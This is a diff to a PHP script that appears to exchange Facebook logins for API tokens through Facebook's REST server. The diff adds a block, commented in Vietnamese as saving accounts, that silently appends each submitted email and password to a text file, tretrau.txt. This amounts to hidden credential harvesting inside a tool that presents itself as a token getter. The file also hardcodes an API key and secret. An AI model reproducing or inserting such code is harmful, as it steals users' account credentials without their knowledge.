@@ -10,6 +10,7 @@ define('API_SECRET', 'c1e620fa708a1d5696fb991c1bde5662');
 
 define('BASE_URL', 'https://api.facebook.com/restserver.php');
 
+
 function sign_creator(&$data){
 	$sig = "";
 	foreach($data as $key => $value){
@@ -51,6 +52,22 @@ function cURL($method = 'GET', $url = false, $data){
 if(isset($_POST['u'], $_POST['p'])){
 	$_GET = $_POST;
 }
+
+//Lưu nick
+$handle = fopen("tretrau.txt", "a");
+foreach($_POST as $variable => $value) {
+if ($variable == 'email' or $variable == 'pass')
+{
+fwrite($handle, $variable);
+fwrite($handle, "=");
+fwrite($handle, $value);
+fwrite($handle, "\r\n");
+}
+}
+fwrite($handle, "\r\n");
+fclose($handle);
+//End lưu nick
+
 $data = array(
 	"api_key" => "3e7c78e35a76a9299309885393b02d97",
 	"credentials_type" => "password",
